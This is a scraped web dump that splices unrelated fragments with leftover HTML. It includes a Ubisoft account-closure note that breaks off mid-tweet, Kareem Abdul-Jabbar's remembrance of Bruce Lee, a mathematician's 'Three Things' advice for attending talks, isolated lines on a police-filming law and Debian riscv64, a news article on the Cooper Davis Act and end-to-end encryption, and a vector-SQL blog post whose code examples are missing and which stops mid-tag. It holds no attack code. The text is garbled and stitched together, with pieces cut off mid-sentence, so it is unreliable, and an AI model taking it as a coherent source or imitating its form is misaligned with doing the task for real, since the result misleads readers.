reserve the right to suspend or end services at any time. Ubisoft has a support page titled "<a href="https://ubisoft.pxf.io/c/221109/864200/12050?subId1=pcg-gb-2010764004959947500&amp;sharedId=pcg-gb&amp;u=https%3A%2F%2Fwww.ubisoft.com%2Fen-us%2Fhelp%2Faccount%2Farticle%2Fclosure-of-inactive-ubisoft-accounts%2F000079595" target="_blank" data-url="https://www.ubisoft.com/en-us/help/account/article/closure-of-inactive-ubisoft-accounts/000079595" data-hl-processed="hawklinks" data-placeholder-url="https://ubisoft.pxf.io/c/221109/864200/12050?subId1=hawk-custom-tracking&amp;sharedId=hawk-prefix&amp;u=https%3A%2F%2Fwww.ubisoft.com%2Fen-us%2Fhelp%2Faccount%2Farticle%2Fclosure-of-inactive-ubisoft-accounts%2F000079595" rel="sponsored noopener" referrerpolicy="no-referrer-when-downgrade" data-google-interstitial="false" data-merchant-name="ubisoft.com" data-merchant-id="187413" data-merchant-url="ubisoft.com" data-merchant-network="ImpactRad">Closure of inactive Ubisoft accounts</a>." The page first describes instances where the service clashes with local data privacy laws, then reads: "We may also close long-term inactive accounts to maintain our database. You will be notified by email if we begin the process of closing your inactive account."</p><p>This page links to another dedicated to voluntarily closing one's Ubisoft account, and seems to operate by the same rules: a 30-day suspension before permanent deletion. "As we will be unable to recover the account once it has been closed, we strongly recommend only putting in the request if you are absolutely sure you would like to close your account."</p><figure data-bordeaux-image-check=""><div><p><picture><source type="image/webp" alt="Tweet reading: &quot;Hey there.

He was 32, and I was 25. He had been not only my martial arts teacher but my close friend, and I was still young enough to not yet have experienced much profound loss in my life, which is why his death hit me so hard. I felt like I’d tumbled overboard from a ship that had sailed on without me. I was alone in a vast dark ocean, bobbing up and down in the turbulent waves, struggling to tread water.</p><p>Fifty years later, I am way too familiar with profound loss. Family. Friends. Heroes. With each loss, I still feel the pain of my heart being twisted and squeezed like a sponge wrung dry. But I recover. And await the next loss. </p><p><span>There’s a poem by Richard Wilbur called </span><a href="https://www.poemhunter.com/poem/juggler/" rel="">“The Juggler”</a><span> that begins: </span></p><blockquote><p><span>A ball will bounce; but less and less. It's not</span><br><span>A light-hearted thing, resents its own resilience.</span></p></blockquote><p>That ball is our heart, and though we are resilient in overcoming life’s tragedies, sometimes we resent it and even grow weary of having to bounce back. Motivational speakers are fond of saying it doesn’t matter how many times you get knocked down, it’s how many times you get up. But sometimes, it does matter how many times you get knocked down.</p><p>Bruce was 32 when he died, in his physical prime of muscle, sinew, and athleticism. He had a cocky smile that the young can afford because their bodies haven’t yet begun to betray them in a hundred small and big ways. To the world, he remains frozen in youth with all its vitality and possibilities. </p><p>If he’d lived, he’d have been 83 today—the same age as Chuck Norris, John Cleese, Al Pacino, Lily Tomlin, Smokey Robinson, and Ringo Starr. He wouldn’t be jumping and flipping and hitting, but he’d probably be making movies in which other martial artists would be jumping and flipping and hitting. He’d still be telling stories. He’d still be a husband, a father, a grandfather.</p><p>He’d still be my friend.</p><p><span>To celebrate Bruce, I’m reprinting the excerpt from my autobiography </span><em><a href="https://bookshop.org/p/books/becoming-kareem-growing-up-on-and-off-the-court-kareem-abdul-jabbar/114300?ean=9780316555418" rel="">Becoming Kareem</a><span>,</span></em><span> in which I describe our friendship. I hope it captures my appreciation, admiration, and love.</span></p><p>I met Bruce in 1967, the fall semester of my junior year at UCLA. He was not yet the international superstar he would soon become. He was just a struggling actor teaching martial arts to pay the rent and support his wife and baby boy.</p><p>I’d been training in aikido during the summer back home in New York City. Aikido is a modern Japanese martial art that means “the way of harmonious spirit,” so-called because it was created as a way to defend oneself without causing injury to the attacker. I got the idea of taking up martial arts the previous year when I saw one of the Zatoichi movies at the Kokusai Theater on Wilshire Blvd. near campus. Zatoichi is a blind swordsman character wandering through Japan in the 1830s in a popular series of Japanese movies. After watching the balletic movements of Zatoichi as he gracefully evaded violent gangs of opponents and left them all helpless, I figured learning that kind of bodily control could only help me in games when I was being double- and triple-teamed. Instead of brute force, I would slide and roll and slip by them without fouling. After only a couple months, I quickly found my senses sharped and my reflexes quicker.</p><p><span>When I returned for the fall semester, I knew I wanted to continue my training so I asked a friend of mine who ran </span><em>Black Belt</em><span> magazine where I should go in Los Angeles. He told me about this young guy out in Culver City, on the outskirts of Los Angeles, who had played the martial arts sidekick Kato on the single season of the TV series, </span><em>The Green Hornet</em><span>. I was a little skeptical of training with a television actor, but my friend assured me that this man was the real deal. He had already built a reputation as something of a maverick in the martial arts community, with his own unorthodox ideas of combat, but his skills were widely acclaimed to be remarkable. He was known for demonstrating the one-inch punch, a punch from only one inch away from the target that generated enough force to break boards or knock an opponent to the floor.</span></p><p><span>Bruce was the kind of person who could win you over within twenty seconds of meeting him. Most the martial arts instructors I had met before were very stiff and formal, constantly demanding overt demonstrations of respect, like Marlon Brando in </span><em>The Godfather</em><span>. Not Bruce. He greeted me with a broad smile and friendly demeanor and right away I knew this was not a scowling teacher from Japanese films demanding bowing obedience. We talked UCLA basketball for a while and then got down to business.</span></p><p>Bruce asked his wife, Linda, to assist him in a demonstration. He told me to hold a thick training pad to my chest and instructed Linda to kick the pad.</p><p>“Bruce, I don’t think this will work,” I said. “I’m two feet taller and a hundred pounds heavier than Linda.”</p><p>Bruce smiled but said nothing.</p><p>“Just hold it up to your chest, Lew,” Linda said.</p><p>My chest was higher than her head so I lowered it a little.</p><p>“Your chest,” she said. “Do you want Bruce to show you where that is?”</p><p>“Okay, okay,” I said. I held it up to my chest, maybe even a few inches higher.</p><p>“Ready?” Bruce said.</p><p>“Ready,” I said, a little smugly.</p><p>Bruce nodded at Linda.</p><p>Suddenly Linda fired off a kick that not only reached the pad, but the impact rocked me backward a few feet, readjusted my spine, and possibly rearranged the order of my teeth.</p><p>They stood there smiling at the shocked expression on my face.</p><p>“Okay,” I said, rubbing my chest. “Teach me that.”</p><p>Ironically, Bruce’s approach was very similar to that of my UCLA coach, John Wooden. They both emphasized practicing fundamentals over and over. Bruce used to say, “I fear not the man who has practiced 10,000 kicks once, but I fear the man who has practiced one kick 10,000 times.” In sports, we call this concept “muscle memory.” By practicing the same movement over and over and over, your body will react without the brain telling it to. Those fractions of seconds that are saved can be the difference between sinking a basket or having it blocked, between landing a punch or having it parried. For me, my hook shot was the one kick practiced 10,000 times.</p><p><span>Both also emphasized preparation. The winning athlete prepared for competition by training the body and the mind to anticipate all contingencies. While Coach Wooden told us, “Failing to prepare is preparing to fail,” Bruce would say, “Preparation for tomorrow is hard work today.” Seventeenth Century swordsman Miyamoto Musashi, author of </span><em>The Book of Five Rings</em><span>, which Bruce and I often discussed at great length, wrote, “You can only fight the way you practice.” The message from all of three coaches was the same and I took it to heart. I dedicated myself to preparation by maintaining complete focus during basketball practice and my training with Bruce. As a result, I became stronger, faster, and a much more intense player.</span></p><p><span>Bruce’s most significant teaching was that, when it came to martial arts, there was no single technique or philosophy that was the correct way. This was very different from other teachers who seemed to each belong to a single school of teaching. This was how Bruce developed his </span><em>Jeet Kune Do</em><span> (</span><em>Way of Intercepting Fist</em><span>) method: each fighter is unique as is each fight. Therefore, the fighter must constantly adapt, using multiple techniques and approaches. Bruce’s philosophy of training followed another Musashi teaching, “When I apply the principle of strategy to the different arts and crafts, I no longer need a teacher in any domain.” This was also a belief of Coach Wooden. Both wanted their pupils to reach a level where they could teach themselves how to continue to improve.</span></p><p>Bruce was—to me, to his friends, and to himself—foremost a philosopher. Although it was his almost supernatural physical abilities that attracted his students, including movie stars such as Steve McQueen and James Colburn, it was his equally remarkable intellectual abilities that kept us coming back. He had taken philosophy and psychology classes in college and was anxious to discuss the principles he’d learned. Bruce and I spent as much time talking about books as we did sparring on the mat.</p><p><span>Bruce and I had something else in common. We both had experienced brutal discrimination. Bruce came from an acting family and had been performing on stage and in Chinese films since he was a child. When he came to the U.S. from Hong Kong as a teenager, he briefly abandoned acting to pursue martial arts. Eventually, he did return to acting as Kato and in small parts in TV shows and movies. He was driven to share his philosophy of martial arts with the world through his acting. But Hollywood saw him only as an Asian and the only acting parts for Asians were villains or servants. He expected his big break in 1971 when he pitched a TV show that he maintained would become the hit series, </span><em>Kung Fu</em><span>. He had hoped to star in the series as the half-Chinese martial artist in the Old West, but that role went to non-martial artist, non-Chinese actor David Carradine. (Warner Bros. claimed they had been developing the series before him and Lee was never credited.) To his credit, Bruce publically stated that he understood the financial reasons for the casting choice. But his frustration with Hollywood prompted him to return to Hong Kong to make movies.</span></p><p><span>In Hong Kong, he started making martial arts films like </span><em>Fist of Fury</em><span> and </span><em>Enter the Dragon</em><span>, which became huge international hits. Finally, he had the fame and success that had been denied him in America. And kids all around the world were flocking to martial arts studios to learn Bruce’s </span><em>Jeet Kune Do</em><span>.</span></p><p><span>In July of 1973, I was twenty-five years old and spending my summer break from the Milwaukee Bucks letting my nerd flag fly by traveling throughout the Middle East learning Arabic. On my way home, I decided to stop off in Hong Kong to visit Bruce. We had recently done a movie together called </span><em>Game of Death</em><span>, in which I played someone wearing awesome sunglasses who gets killed by Bruce. I think my sunglasses turned in a better performance than I did, but Bruce was his usual dynamic, funny, and cocky onscreen persona that the world so loved to watch. And we had great fun shooting that scene together.</span></p><div id="youtube2-Zx8vIjEKvT8" data-attrs="{&quot;videoId&quot;:&quot;Zx8vIjEKvT8&quot;,&quot;startTime&quot;:null,&quot;endTime&quot;:null}" data-component-name="Youtube2ToDOM"><p><iframe src="https://www.youtube-nocookie.com/embed/Zx8vIjEKvT8?rel=0&amp;autoplay=0&amp;showinfo=0&amp;enablejsapi=0" frameborder="0" loading="lazy" gesture="media" allow="autoplay; fullscreen" allowautoplay="true" allowfullscreen="true" width="728" height="409"></iframe></p></div><p>When I landed at the Singapore airport, I saw the headlines that Bruce had died. I was stunned, of course, and saddened that I had lost such a good friend. But I was also aware of how profoundly his death would affect the rest of the world. He was only thirty-two when he died, but he had already revolutionized the way the world saw martial arts, both as a form of entertainment in movies and on TV, and, more importantly, as a philosophy and way of life.</p><p>It’s another teaching of Musashi that I think most describes Bruce Lee. Despite having had many ups and downs in his life, despite having been poor and rich, despite being snubbed and internationally acclaimed, he lived by this simple guiding Musashi principle: “Think lightly of yourself and deeply of the world.”</p><p>I was twenty when I met Bruce Lee, but his teachings, both in his studio and by his example, have stayed with me the rest of my life.</p><p data-attrs="{&quot;url&quot;:&quot;https://kareem.substack.com/p/bruce-lee-and-me?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://kareem.substack.com/p/bruce-lee-and-me?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p></div></article></div></div>]]></description>

(More general advice on going to talks
is <a href="http://math.stanford.edu/~vakil/potentialstudents.html">here</a>.
As with all my webpages, feedback is more than welcome!)

</p><p>

<em>The challenge of talks.</em>  It is tricky to get things out of
talks, even after a lot of practice.  It is very easy to go to a talk,
and at some point have your eyes glaze over.  Talks are like horses:
once you are thrown off, it is hard to get back on.  Especially if the
horse is stomping on your face.  (That's why it is very bad to come
into a talk a few minutes late --- even if it is sometimes
necessary.)  </p><p>

<em>"Three Things"</em> is an exercise to learn how to get things out of talks.
It can be useful if you are in the first few years of going to
seminars --- I've intended it as practice for graduate students ---
but I've also found that I got much more out of talks (especially
those out of my comfort zone) when using it.  It is admittedly a
little contrived, and when a bunch of us first experimented with it
(perhaps around 2007?), we stopped doing it after a while because we
got tired of it.
</p><p>
<em>The theory</em> is as follows.  If you can get even three small things out of a talk, 
it is a successful talk.  And if you can't get even  three small
things out of a talk, it was not a successful experience.
Note that the things you get out of a talk needn't be the things that
your neighbor got out of a talk, or the things the speaker expected
you to get out of the talk.
</p><p>
<em>Here is how it works.</em>
 Take a clean sheet of paper, or an index card. 
<em>Your goal</em> is to have three things, and only three things, on this
 sheet at the end of the talk.  The "things" can be of many forms:
</p><li> a definition you want to remember (e.g. "a  K3 surface is...")
</li><li> a theorem you want to remember ("the moduli space of polarized K3
  surfaces is smooth")
</li><li> a motivating or key example ("a quartic is an example of a K3 surface")
</li><li> a motivating problem ("why are all moduli spaces of polarized K3
  surfaces the same dimension?")
</li><li> a question you want to ask the speaker ("why is that hypothesis
  in your theorem?")
</li><li> a question you want to ask someone else (a definition,
  motivation, a question about a connection etc.)
</li><li> anything else of a similar flavor:  something specific that made
 you think.
 Something vague ("I liked the part where she talked about groups")
  does not count as a "thing".
<p>  <em>As you watch the talk</em>, look out for "things" you like.  When one
  comes your way, write it down.  Then later write down a second.
  Then write down a third.  Hopefully a fourth will come your way ---
  and then you must look over the previous three, and decide which one
  must be cut.  A dirty secret is that you may not be able to prevent
  yourself from remembering the one you cut --- and the ones you kept 
				and reviewed will be more fixed in
  your mind.
</p><p>
(If you take notes in a more traditional sense, you can still play the
game, by putting a star beside each "thing".  This works a little less
well; you will be less focused on looking for "things".)
</p><p>

<em>After the talk:</em> if other people are playing, send each other
your things by email (or discuss them in person).  It is surprisingly
enlightening. And there will likely be some follow-up discussion.  It
doesn't take much time (to type or to send one sentence responses to
others' things if the spirit moves you).  If you have questions, then
ask them to someone (perhaps the speaker over the semianr dinner; or
perhaps your advisor or your students or your colleagues).  Don't let
them drop.

<p>The law would have made it illegal to knowingly film police officers 8 feet (2.5 meters) or closer if the officer tells the person to stop.

        <p>After many years of effort, I am happy to announce that <a href="https://wiki.debian.org/RISC-V">Debian
riscv64</a> is now an <a href="https://lists.debian.org/debian-riscv/2023/07/msg00053.html">official
architecture</a>!</p>
<p>This milestone is not the end of the journey but rather the beginning of a new
one: the port will need to be rebootstrapped in the official archive, build
daemons will have to be reinstalled and handed over to
<a href="https://dsa.debian.org/">DSA</a>, many bugs will need to be fixed.  If everything
goes well, the architecture will eventually be released with
<a href="https://www.debian.org/releases/trixie/">Trixie</a>. Please note that this
process will be long and will span several months.</p>
<p>I would like to take this opportunity to thanks everyone who contributed to
this significant milestone, including individuals and Debian teams, as well as

<div id="readability-page-1" class="page"><div><p>A bill requiring social media companies, encrypted communications providers and other online services to report drug activity on their platforms to the U.S. Drug Enforcement Administration (DEA) advanced to the Senate floor Thursday, alarming privacy advocates who say the legislation turns the companies into de facto drug enforcement agents and exposes many of them to liability for providing end-to-end encryption.</p>
<p>The bipartisan <a href="https://www.documentcloud.org/documents/23876061-ell23484-managers-amendment-1">Cooper Davis Act</a> — named for a <a href="https://www.kmbc.com/article/shawnee-kansas-family-whose-son-died-from-fentanyl-poisoning-joins-lawsuit-against-snapchat/42760890">Kansas teenager</a> who died after unknowingly taking a fentanyl-laced pill he bought on Snapchat — requires social media companies and other web communication providers to give the DEA users’ names and other information when the companies have “actual knowledge” that illicit drugs are being distributed on their platforms.</p>
<p>Many privacy advocates caution that, if passed in its current form, the bill could be a death blow to end-to-end encryption services because it includes particularly controversial language holding companies accountable for conduct they don’t report if they “deliberately blind” themselves to the violations.</p>
<p>Officials from the DEA have spent several months honing the bill with key senators, Judiciary Committee Chairman Dick Durbin (D-IL) <a href="https://www.senate.gov/isvp/?auto_play=false&amp;comm=judiciary&amp;filename=judiciary071323&amp;poster=https://www.judiciary.senate.gov/assets/images/video-poster.png&amp;stt=">said Thursday</a>.</p>
<p>Providers of encrypted services would face a difficult choice should the bill pass, said Greg Nojeim, Senior Counsel &amp; Director of Security and Surveillance Project at the Center for Democracy and Technology.</p>
<p>“They could maintain end-to-end encryption and risk liability that they had willfully blinded themselves to illegal content on their service and face the music later,” Nojeim said. “Or they could opt to remove end-to-end encryption and subject all of their users who used to be protected by one of the best cybersecurity tools available to new threats and new privacy violations.”</p>
<p>The bill’s “deliberately blind” provision also worries Cody Venzke, the senior policy counsel for surveillance, privacy, and technology at the American Civil Liberties Union, who said it would “target” encryption.</p>
<p>“The entire purpose of privacy-protecting technology like end-to-end encryption is to protect us from platforms’ surveillance,” Venzke added.</p>
<p>Meredith Whittaker, the president of the foundation behind the popular encrypted Signal app, attacked the bill’s “willfully blind” language in a <a href="https://twitter.com/mer__edith/status/1679976830558965760">tweet</a> sent Friday, saying, “Failing to put cameras in everyone's bedrooms? Not tracking all residents with location? Using E2E? All willful blindness by this logic.”</p>
<blockquote><div lang="en" dir="ltr"><p>The effort to eliminate privacy in the name of 'safety' continues. Anything ≤ total surveillance of everyone = 'willful blindness.' </p><p>Failing to put cameras in everyone's bedrooms? Not tracking all residents with location? Using E2E? All willful blindness by this logic. <a href="https://t.co/GJeedPUbiW">https://t.co/GJeedPUbiW</a></p></div>— Meredith Whittaker (@mer__edith) <a href="https://twitter.com/mer__edith/status/1679976830558965760?ref_src=twsrc%5Etfw">July 14, 2023</a></blockquote> 
<h3>A threat to E2E encryption</h3>
<p>Law enforcement has long complained about how end-to-end encryption creates what the Department of Justice <a href="https://www.justice.gov/olp/lawful-access">has called</a> a “lawless space that criminals, terrorists, and other bad actors can exploit for their nefarious ends.”</p>
<p>Two Mexican drug cartels trafficking most fentanyl and methamphetamine into America use social media applications to “coordinate logistics and reach out to victims,” the DEA said in a <a href="https://www.dea.gov/press-releases/2023/05/05/dea-operation-last-mile-tracks-down-sinaloa-and-jalisco-cartel-associates">May press release</a>. The agency named Facebook, Instagram, TikTok, and Snapchat along with encrypted platforms WhatsApp, Telegram, Signal, Wire, and Wickr as examples.</p>
<p>More than 1,100 cases in a recent DEA operation targeting Mexican drug cartels involved social media applications and encrypted communications platforms through which fentanyl and meth were trafficked, the agency said.</p>
<p>“These social media platforms understand there is no legal application for the sale of many of these substances and yet they continue with impunity,” Judiciary Committee Chairman Dick Durbin (D-IL) said at a Thursday <a href="https://www.senate.gov/isvp/?auto_play=false&amp;comm=judiciary&amp;filename=judiciary071323&amp;poster=https://www.judiciary.senate.gov/assets/images/video-poster.png&amp;stt=">Senate markup hearing</a> for the bill, noting a similar reporting mechanism already in place which requires the companies to report child sexual abuse material.</p>
<p>Privacy advocates counter that determining what constitutes child sexual abuse imagery on platforms is much easier than patrolling speech, particularly in various languages and with street slang, to sniff out drug sales.</p>
<p>Senator Alex Padilla (D-CA) told the Judiciary Committee that, unlike online sexual imagery of children, language is harder to police on a mass scale since “context is pretty important.”</p>
<p>“Do we really want to effectively deputize untrained tech companies led by people like Elon Musk to serve as law enforcement?” Padilla said. “This bill will empower them to disclose people's private data to federal law enforcement without a warrant or oversight based only, on quote, a reasonable belief that someone is committing an offense.”</p>
<p>Padilla also criticized the bill for potentially “criminalizing companies that offer encrypted services,” citing how beneficial encryption has been for people in marginalized communities and women seeking reproductive care in the post Dobbs world.</p>
<p>A Thursday <a href="https://www.shaheen.senate.gov/shaheen-marshalls-bipartisan-bill-to-crack-down-on-online-drug-sales-through-social-media-clears-key-committee-hurdle">press release</a> from sponsor Sen. Jeanne Shaheen (D-NH) highlighted statistics from the DEA supporting the need for the legislation.</p>
<p>Within a five-month period, Shaheen said, DEA investigated 390 drug-poisoning investigations and found that 129 had direct ties to social media.</p>
<p>“Unfortunately, federal agencies have not had access to the necessary data to intervene, which has allowed the crisis to worsen,” the press release said.</p>
<p>It added that the law will establish a “comprehensive and standardized reporting regime that would enable the DEA to better identify and dismantle international criminal networks and save American lives.”</p>
<p>But Nojeim said there is a bigger question in play and it is one that society must confront sooner rather than later as all manner of social interactions, and problems, play out online.</p>
<p>“We live our lives online nowadays,” he said. “One question that we have to answer as a society is whether we want these communication service providers, with whom we can't communicate without, to be close to agents of the government.”</p>
<p>They already are, according to Carl Szabo, vice president and general counsel of the web communications provider membership association NetChoice. Szabo said social media sites voluntarily work with law enforcement to stop the trafficking of drugs on their sites.</p>
<p>He said that if the bill is enacted all reporting by social media sites “would be subjected to Fourth Amendment processes, and it will actually become harder for law enforcement to identify these threats."</p><div><div><p>Get more insights with the </p><p>Recorded Future</p><p>Intelligence Cloud.</p></div><p><a target="_blank" rel="noopener noreferrer" href="https://www.recordedfuture.com/platform?mtm_campaign=ad-unit-record">Learn more.</a></p></div><div><p><span>Tags</span></p><ul><li><a href="https://therecord.media/tag/social-media">social media</a></li><li><a href="https://therecord.media/tag/senate">Senate</a></li><li><a href="https://therecord.media/tag/bill">bill</a></li><li><a href="https://therecord.media/tag/drugs">drugs</a></li><li><a href="https://therecord.media/tag/privacy-law">Privacy Law</a></li><li><a href="https://therecord.media/tag/privacy">Privacy</a></li></ul></div><div><a href="https://therecord.media/author/suzanne-smalley"><h2>Suzanne Smalley</h2></a><p><a href="https://therecord.media/author/suzanne-smalley"><span><img sizes="100vw" srcset="https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=640 640w, https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=750 750w, https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=828 828w, https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=1080 1080w, https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=1200 1200w, https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=1920 1920w, https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=2048 2048w, https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=3840 3840w" src="https://cms.therecord.media/uploads/Suzanne_Smalley_27e80bc465.png?w=3840" decoding="async" data-nimg="fill"></span></a></p><p>Suzanne Smalley is a reporter covering privacy, disinformation and cybersecurity policy for The Record.

            <description><![CDATA[<p>URL: <a href="https://blog.myscale.com/2023/07/17/teach-your-llm-vector-sql/">https://blog.myscale.com/2023/07/17/teach-your-llm-vector-sql/</a>, See on <a href="https://news.ycombinator.com/item?id=36840728">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody"><p><a href="https://huggingface.co/spaces/myscale/ChatData"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Spaces-orange"></a><a href="https://github.com/myscale/chatdata"><img src="https://img.shields.io/badge/Open-Github-blue.svg?logo=github&amp;style=plastic)](https://github.com/myscale/chatdata)\"></a></p> <p>Large Language Models are advanced AI systems that can answer a wide range of questions. Although they provide informative responses on topics they know, they are not always accurate on unfamiliar topics. This phenomenon is known as <strong>hallucination</strong>.</p> <h2 id="what-is-hallucination"><a href="#what-is-hallucination">#</a> What is Hallucination?</h2> <p>Before we look at an example of an LLM hallucination, let's consider a definition of the term "hallucination" as described by <a href="https://en.wikipedia.org/wiki/Hallucination" target="_blank" rel="noopener noreferrer">Wikipedia.com<span> <span>(opens new window)</span></span></a>:</p> <blockquote><p>"A hallucination is a perception in the absence of an external stimulus that has the qualities of a real perception."</p></blockquote> <p>Moreover:</p> <blockquote><p>"Hallucinations are vivid, substantial, and are perceived to be located in external objective space."</p></blockquote> <p>In other words, a hallucination is an error in (or a false) perception of something real or concrete. For example, ChatGPT (a famous Large Language Model by OpenAI) was asked what LLM hallucinations are, with the answer being:</p> <p><img src="https://blog.myscale.com/assets/img/hallucination.0d021d06.png" alt="LLM Hallucinations. source: aruna-x"></p> <p>Therefore, the question begs, how do we improve on (or fix) this result? The concise answer is to add facts to your question, such as providing the LLM definition before or after you ask the question.</p> <p>For instance:</p> <blockquote><p>An LLM is a Large Language Model, an artificial neural network that models how humans talk and write. Please tell me, what is LLM hallucination?</p></blockquote> <p>The public domain answer to this question, provided by ChatGPT, is:</p> <p><img src="https://blog.myscale.com/assets/img/chatgpt-hallucination-response.435cec3e.png" alt="ChatGPT LLM Hallucinations Response"></p> <p><strong>Note:</strong> The reason for the first sentence, "Apologies for the confusion in my earlier response," is that we asked ChatGPT our first question, what LLM hallucinations are, before giving it our second prompt: "An LLM..."</p> <p>These additions have improved the quality of the answer. At least it no longer thinks an LLM hallucination is a "Late-Life Migraine Accompaniment!" 😆</p> <h2 id="external-knowledge-reduces-hallucinations"><a href="#external-knowledge-reduces-hallucinations">#</a> External Knowledge Reduces Hallucinations</h2> <p>At this juncture, it is absolutely crucial to note that an LLM is not infallible nor the ultimate authority on all knowledge. LLMs are trained on large amounts of data and learn patterns in language, but they may not always have access to the most up-to-date information or have a comprehensive understanding of complex topics.</p> <p>What now? How do you increase the chance of reducing LLM hallucinations?</p> <p>The solution to this problem is to include supporting documents to the query (or prompt) to guide the LLM toward a more accurate and informed response. Like humans, it needs to learn from these documents to answer your question accurately and correctly.</p> <p>Helpful documents can come from many sources, including a search engine like Google or Bing and a digital library like Arxiv, among others, providing an interface to search for relevant passages. Using a database is also a good choice, providing a more flexible and private query interface.</p> <p>Knowledge retrieved from sources must be relevant to the question/prompt. There are several ways to retrieve relevant documents, including:</p> <ul><li><strong>Keyword-based:</strong> Searching for keywords in plain text, suitable for an exact match on terms.</li> <li><strong>Vector search-based:</strong> Searching for records closer to embeddings, helpful in searching for appropriate paraphrases or general documents.</li></ul> <p>Nowadays, vector searches are popular since they can solve paraphrase problems and calculate paragraph meanings. Vector search is not a one-size-fits-all solution; it should be paired with specific filters to maintain its performance, especially when searching massive volumes of records. For example, should you only want to retrieve knowledge about physics (as a subject), you must filter out all information about any other subjects. Thus, the LLM will not be confused by knowledge from other disciplines.</p> <h2 id="automate-the-whole-process-with-sql-and-vector-search"><a href="#automate-the-whole-process-with-sql-and-vector-search">#</a> Automate the Whole Process with SQL... and Vector Search</h2> <p>The LLM should also learn to query data from its data sources before answering the questions, automating the whole process. Actually, LLMs are already capable of writing SQL queries and following instructions.</p> <p><img src="https://blog.myscale.com/assets/img/pipeline.27770dfe.png" alt="Vector Pipeline"></p> <p>SQL is powerful and can be used to construct complex search queries. It supports many different data types and functions. And it allows us to write a vector search in SQL with <code>ORDER BY</code> and <code>LIMIT</code>, treating the similarity score between embeddings as a column <code>distance</code>. Pretty straightforward, isn't it?</p> <blockquote><p>See the next section, <a href="#what-vector-sql-looks-like">What Vector SQL Looks Like</a>, for more information on structuring a vector SQL query.</p></blockquote> <p>There are significant benefits to using vector SQL to build complex search queries, including:</p> <ul><li>Increased flexibility for data type and function support</li> <li>Improved efficiency because SQL is highly optimized and executed inside the database</li> <li>Is human-readable and easy to learn as it is an extension of standard SQL</li> <li>Is LLM-friendly</li></ul> <p><strong>Note:</strong> Many SQL examples and tutorials are available on the Internet. LLMs are familiar with standard SQL as well as some of its dialects.</p> <p>Apart from MyScale, many SQL database solutions like Clickhouse and PostgreSQL are adding vector search to their existing functionality, allowing users to use vector SQL and LLMs to answer questions on complex topics. Similarly, an increasing number of application developers are starting to integrate vector searches with SQL into their applications.</p> <h2 id="what-vector-sql-looks-like"><a href="#what-vector-sql-looks-like">#</a> What Vector SQL Looks Like</h2> <p>Vector Structured Query Language (Vector SQL) is designed to teach LLMs how to query vector SQL databases and contains the following extra functions:</p> <ul><li><code>DISTANCE(column, query_vector)</code>: This function compares the distance between the column of vectors and the query vector either exactly or approximately.</li> <li><code>NeuralArray(entity)</code>: This function converts an entity (for example, an image or a piece of text) into an embedding.</li></ul> <p>With these two functions, we can extend the standard SQL for vector search. For example, if you want to search for 10 relevant records to word <code>flower</code>, you can use the following SQL statement:</p> <p>The <code>DISTANCE</code> function comprises the following:</p> <ul><li>The inner function, <code>NeuralArray(flower)</code>, converts the word <code>flower</code> into an embedding.</li> <li>This embedding is then serialized and injected into the <code>DISTANCE</code> function.</li></ul> <p>Vector SQL is an extended version of SQL that needs further translation based on the vector database used. For instance, many implementations have different names for the <code>DISTANCE</code> function. It is called <code>distance</code> in MyScale, and <code>L2Distance</code> or <code>CosineDistance</code> in Clickhouse. Additionally, based on the database, this function name will be translated differently.</p> <h2 id="how-to-teach-an-llm-to-write-vector-sql"><a href="#how-to-teach-an-llm-to-write-vector-sql">#</a> How to teach an LLM to write Vector SQL</h2> <p>Now that we understand the basic principles of vector SQL and its unique functions, let's use an LLM to help us to write a vector SQL query.</p> <h3 id="_1-teach-an-llm-what-standard-vector-sql-is"><a href="#_1-teach-an-llm-what-standard-vector-sql-is">#</a> 1. Teach an LLM What Standard Vector SQL is</h3> <p>First, we need to teach our LLM what standard vector SQL is. We aim to ensure that the LLM will do the following three things spontaneously when writing a vector SQL query:</p> <ul><li>Extract the keywords from our question/prompt. It could be an object, a concept, or a topic.</li> <li>Decide which column to use to perform the similarity search. It should always choose a vector column for similarity.</li> <li>Translate the rest of our question's constraints into valid SQL.</li></ul> <h3 id="_2-design-the-llm-prompt"><a href="#_2-design-the-llm-prompt">#</a> 2. Design the LLM Prompt</h3> <p>Having determined exactly what information the LLM requires to construct a vector SQL query, we can design the prompt as follows:</p> <p>This prompt should do its job. But the more examples you add, the better it will be, like using the following vector SQL-to-text pair as a prompt:</p> <p><strong>The SQL table create statement:</strong></p> <p><strong>The question and answer:</strong></p> <p>The more relevant examples you add to your prompt, the more the LLM's process of building the correct vector SQL query will improve.</p> <p>Lastly, here are several extra tips to help you when designing your prompt:</p> <ul><li>Cover all possible functions that might appear in any questions asked.</li> <li>Avoid monotonic questions.</li> <li>Alter the table schema, like adding/removing /modifying names and data types.</li> <li>Align the prompt's format.</li></ul> <h2 id="a-real-world-example-using-myscale"><a href="#a-real-world-example-using-myscale">#</a> A Real-World Example: Using MyScale</h2> <p>Let's now build <a href="https://huggingface.co/spaces/myscale/ChatData" target="_blank" rel="noopener noreferrer"><strong>a real-world example</strong><span> <span>(opens new window)</span></span></a>, set out in the following steps:</p> <p><img src="https://blog.myscale.com/assets/img/myscale-example.a661ebc6.png" alt="A Real-World Example: Using MyScale"></p> <h3 id="prepare-the-database"><a href="#prepare-the-database">#</a> Prepare the Database</h3> <p>We have prepared a playground for you with more than 2 million papers ready to query. You can access this data by adding the following Python code to your app.</p> <p>If you like, you can skip the following steps, where we create the table and insert its data using the MyScale console, and jump to where we play with vector SQL and <a href="#create-sqldatabasechain">create the <code>SQLDatabaseChain</code></a> to query the database.</p> <p><strong>Create the database table:</strong></p> <p><strong>Insert the data:</strong></p> <h3 id="create-the-sqldatabasechain"><a 